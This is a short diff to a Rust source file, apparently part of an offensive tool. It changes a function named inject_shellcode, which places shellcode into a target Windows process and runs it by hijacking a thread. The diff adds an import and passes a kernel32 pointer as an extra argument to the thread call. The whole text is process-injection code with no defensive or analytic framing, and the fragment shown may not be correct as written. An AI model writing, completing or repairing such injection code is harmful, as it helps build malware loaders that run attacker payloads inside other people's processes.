@@ -9,6 +9,8 @@ use winapi::{
     },
 };
 
+use std::ffi::c_void as std_c_void;
+
 mod func;
 
 pub fn inject_shellcode(process_name: &str, shellcode: &[u8]) -> Result<(), String> {
@@ -45,6 +47,7 @@ pub fn inject_shellcode(process_name: &str, shellcode: &[u8]) -> Result<(), Stri
         process_handle,
         Some(shellcode_location),
         None,
+        kernel32 as *mut std_c_void,
     ) {
         return Err("Failed to hijack thread".to_string());
     }
